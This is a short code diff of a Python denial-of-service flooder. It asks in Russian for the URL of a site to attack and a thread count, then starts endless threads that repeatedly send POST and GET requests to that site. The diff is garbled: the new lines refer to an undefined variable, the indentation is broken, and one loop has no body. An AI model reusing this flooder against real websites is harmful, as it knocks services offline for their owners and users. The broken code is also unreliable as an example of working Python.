@@ -10,12 +10,12 @@ targ = input("Введите ссылку на сайт для атаки: ")
 thrnom = input('Threads: ')
 
 def ddos():
- while True:
-  spam = requests.post(targ)
-  spam2 = requests.get(targ)
-  print("[+] Заход на сайт выполнен!")
- for i in range(int(thrnom)):
+while(1<10):
+  spam = requests.post(url)
+  spam2 = requests.get(url)
+for i in range(int(thrnom)):
   
 while True:
- threading.Thread(target=ddos).start()
- print('DDOS is running...')
+  thr = Thread(target=ddos)
+  thr.start()
+ print("[+] Заход на сайт выполнен!")
